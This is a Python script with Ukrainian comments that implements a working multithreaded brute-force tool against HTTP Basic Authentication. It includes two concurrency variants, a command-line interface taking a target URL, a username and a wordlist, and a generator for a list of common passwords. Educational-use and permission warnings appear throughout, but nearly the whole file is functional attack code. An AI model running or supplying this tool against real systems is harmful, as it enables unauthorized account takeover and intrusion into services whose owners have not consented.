#!/usr/bin/env python3
"""
Багатопотоковий інструмент для брутфорсу HTTP Basic Authentication
Використовує ThreadPoolExecutor та Queue для паралельної перевірки паролів

⚠️⚠️⚠️ УВАГА! ⚠️⚠️⚠️
Цей код призначений ВИКЛЮЧНО для:
- Навчальних цілей
- Тестування ВЛАСНИХ систем
- Авторизованого пентестингу
- CTF змагань

Використання проти чужих систем без дозволу є НЕЗАКОННИМ!
"""

import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import argparse
from queue import Queue
import threading
from requests.auth import HTTPBasicAuth


class HTTPBruteForcer:
    """Клас для брутфорсу HTTP Basic Authentication"""

    def __init__(self, target_url, username, max_workers=10):
        self.target_url = target_url
        self.username = username
        self.max_workers = max_workers
        self.found_password = None
        self.attempts = 0
        self.lock = threading.Lock()
        self.start_time = None

    def try_password(self, password):
        """
        Спроба входу з паролем

        Args:
            password: пароль для перевірки

        Returns:
            tuple: (success, password, status_code)
        """
        with self.lock:
            self.attempts += 1
            current_attempt = self.attempts

        try:
            response = requests.get(
                self.target_url,
                auth=HTTPBasicAuth(self.username, password),
                timeout=5
            )

            # Успішна аутентифікація
            if response.status_code == 200:
                return (True, password, response.status_code)
            else:
                return (False, password, response.status_code)

        except requests.RequestException as e:
            return (False, password, None)

    def brute_force(self, password_list):
        """
        Виконує брутфорс з використанням списку паролів

        Args:
            password_list: список паролів для перевірки

        Returns:
            str: знайдений пароль або None
        """
        self.start_time = time.time()

        print(f"\n{'='*70}")
        print(f"🔐 HTTP Basic Auth Brute Force")
        print(f"{'='*70}")
        print(f"🎯 Target URL: {self.target_url}")
        print(f"👤 Username: {self.username}")
        print(f"📝 Passwords to try: {len(password_list)}")
        print(f"🧵 Worker threads: {self.max_workers}")
        print(f"⏰ Started: {time.strftime('%H:%M:%S')}")
        print(f"{'='*70}\n")

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {
                executor.submit(self.try_password, password): password
                for password in password_list
            }

            for future in as_completed(futures):
                if self.found_password:
                    # Пароль вже знайдено, скасовуємо інші задачі
                    for f in futures:
                        f.cancel()
                    break

                success, password, status_code = future.result()

                if success:
                    self.found_password = password
                    elapsed = time.time() - self.start_time

                    print(f"\n{'='*70}")
                    print(f"✅ SUCCESS! Password found!")
                    print(f"{'='*70}")
                    print(f"🔑 Username: {self.username}")
                    print(f"🔑 Password: {password}")
                    print(f"⏱️  Time: {elapsed:.2f} seconds")
                    print(f"🔢 Attempts: {self.attempts}/{len(password_list)}")
                    print(f"⚡ Speed: {self.attempts / elapsed:.2f} attempts/sec")
                    print(f"{'='*70}\n")

                    # Скасовуємо інші задачі
                    for f in futures:
                        f.cancel()

                    return password

                else:
                    # Прогрес кожні 10 спроб
                    if self.attempts % 10 == 0:
                        elapsed = time.time() - self.start_time
                        speed = self.attempts / elapsed if elapsed > 0 else 0
                        progress = (self.attempts / len(password_list)) * 100

                        print(f"⏳ Progress: {progress:5.1f}% | "
                              f"Tried: {self.attempts:4d}/{len(password_list)} | "
                              f"Speed: {speed:5.1f} att/s")

        # Якщо пароль не знайдено
        elapsed = time.time() - self.start_time

        print(f"\n{'='*70}")
        print(f"❌ Password not found")
        print(f"{'='*70}")
        print(f"⏱️  Total time: {elapsed:.2f} seconds")
        print(f"🔢 Total attempts: {self.attempts}")
        print(f"⚡ Average speed: {self.attempts / elapsed:.2f} attempts/sec")
        print(f"{'='*70}\n")

        return None


class QueueBasedBruteForcer:
    """Брутфорсер з використанням Queue"""

    def __init__(self, target_url, username, num_workers=10):
        self.target_url = target_url
        self.username = username
        self.num_workers = num_workers
        self.password_queue = Queue()
        self.found_password = None
        self.attempts = 0
        self.lock = threading.Lock()
        self.stop_event = threading.Event()

    def worker(self, worker_id):
        """Робочий потік для перевірки паролів"""
        while not self.stop_event.is_set():
            try:
                password = self.password_queue.get(timeout=1)
            except:
                continue

            if self.found_password:
                self.password_queue.task_done()
                break

            try:
                response = requests.get(
                    self.target_url,
                    auth=HTTPBasicAuth(self.username, password),
                    timeout=5
                )

                with self.lock:
                    self.attempts += 1

                    if response.status_code == 200:
                        self.found_password = password
                        self.stop_event.set()
                        print(f"\n🎉 [Worker-{worker_id}] Found password: {password}")
                        print(f"   Attempts: {self.attempts}")
                    elif self.attempts % 20 == 0:
                        print(f"⏳ Tried {self.attempts} passwords...")

            except Exception as e:
                pass

            finally:
                self.password_queue.task_done()

    def brute_force(self, passwords):
        """Запускає брутфорс"""
        print(f"\n{'='*70}")
        print(f"🔐 Queue-Based HTTP Brute Force")
        print(f"{'='*70}")
        print(f"🎯 Target: {self.target_url}")
        print(f"👤 Username: {self.username}")
        print(f"📝 Dictionary size: {len(passwords)} passwords")
        print(f"🧵 Worker threads: {self.num_workers}")
        print(f"{'='*70}\n")

        start_time = time.time()

        # Додаємо паролі в чергу
        for password in passwords:
            self.password_queue.put(password)

        # Створюємо воркерів
        workers = []
        for i in range(self.num_workers):
            worker = threading.Thread(target=self.worker, args=(i,))
            worker.start()
            workers.append(worker)

        # Чекаємо завершення
        self.password_queue.join()
        self.stop_event.set()

        for worker in workers:
            worker.join()

        elapsed = time.time() - start_time

        print(f"\n{'='*70}")
        if self.found_password:
            print(f"✅ SUCCESS!")
            print(f"🔑 Password: {self.found_password}")
        else:
            print(f"❌ Password not found")
        print(f"⏱️  Time: {elapsed:.2f} seconds")
        print(f"🔢 Attempts: {self.attempts}")
        print(f"⚡ Speed: {self.attempts / elapsed:.2f} attempts/sec")
        print(f"{'='*70}\n")

        return self.found_password


def load_password_list(filename):
    """Завантажує список паролів з файлу"""
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        print(f"✅ Loaded {len(passwords)} passwords from {filename}")
        return passwords
    except FileNotFoundError:
        print(f"❌ File {filename} not found")
        return []


def create_test_dictionary(filename="test_passwords.txt"):
    """Створює тестовий словник паролів"""
    common_passwords = [
        "password", "123456", "password123", "admin", "letmein",
        "welcome", "monkey", "dragon", "master", "sunshine",
        "princess", "qwerty", "123456789", "12345678", "12345",
        "1234567", "password1", "123123", "1234567890",
        "Password1", "1234", "qwerty123", "1q2w3e4r", "admin123",
        "root", "toor", "pass", "test", "guest", "user",
        "default", "changeme", "password!", "P@ssw0rd", "secret"
    ]

    with open(filename, 'w', encoding='utf-8') as f:
        for password in common_passwords:
            f.write(password + '\n')

    print(f"✅ Created test dictionary: {filename} ({len(common_passwords)} passwords)")
    return filename


def main():
    """Головна функція з CLI"""
    parser = argparse.ArgumentParser(
        description="Multi-threaded HTTP Basic Auth brute force tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t http://testserver/admin -u admin -w wordlist.txt
  %(prog)s -t http://192.168.1.1 -u root -w passwords.txt --threads 20

⚠️  WARNING: Only use on systems you own or have permission to test!
⚠️  Unauthorized access to computer systems is illegal!
        """
    )

    parser.add_argument(
        '-t', '--target',
        required=True,
        help='Target URL (e.g., http://example.com/admin)'
    )

    parser.add_argument(
        '-u', '--username',
        required=True,
        help='Username to test'
    )

    parser.add_argument(
        '-w', '--wordlist',
        help='Password wordlist file'
    )

    parser.add_argument(
        '--threads',
        type=int,
        default=10,
        help='Number of worker threads (default: 10)'
    )

    parser.add_argument(
        '--method',
        choices=['executor', 'queue'],
        default='executor',
        help='Method to use (default: executor)'
    )

    parser.add_argument(
        '--create-wordlist',
        action='store_true',
        help='Create a test wordlist'
    )

    args = parser.parse_args()

    # Створення тестового словника
    if args.create_wordlist:
        create_test_dictionary("test_passwords.txt")
        return

    # Завантаження паролів
    if not args.wordlist:
        print("❌ Error: --wordlist is required (or use --create-wordlist)")
        return

    passwords = load_password_list(args.wordlist)
    if not passwords:
        return

    # Вибір методу
    if args.method == 'queue':
        brute_forcer = QueueBasedBruteForcer(
            args.target,
            args.username,
            args.threads
        )
    else:
        brute_forcer = HTTPBruteForcer(
            args.target,
            args.username,
            args.threads
        )

    # Запуск брутфорсу
    try:
        brute_forcer.brute_force(passwords)
    except KeyboardInterrupt:
        print("\n\n⚠️  Brute force interrupted by user")


if __name__ == "__main__":
    print("\n" + "="*70)
    print("⚠️  ETHICAL WARNING ⚠️")
    print("="*70)
    print("This tool is for EDUCATIONAL PURPOSES ONLY!")
    print("Only use on systems you own or have explicit permission to test.")
    print("Unauthorized access is illegal and unethical.")
    print("="*70 + "\n")

    # Приклад використання без CLI
    if True:  # Змініть на False для використання CLI
        print("📝 Creating test password dictionary...")
        dict_file = create_test_dictionary()

        print("\n⚠️  To use this tool:")
        print("1. Set up a test HTTP Basic Auth server")
        print("2. Uncomment and modify the code below")
        print("3. Run the brute force\n")

        # РОЗКОМЕНТУЙТЕ ДЛЯ ВИКОРИСТАННЯ:
        # passwords = load_password_list(dict_file)
        #
        # brute_forcer = HTTPBruteForcer(
        #     target_url="http://your-test-server/protected",
        #     username="admin",
        #     max_workers=10
        # )
        #
        # result = brute_forcer.brute_force(passwords)
    else:
        main()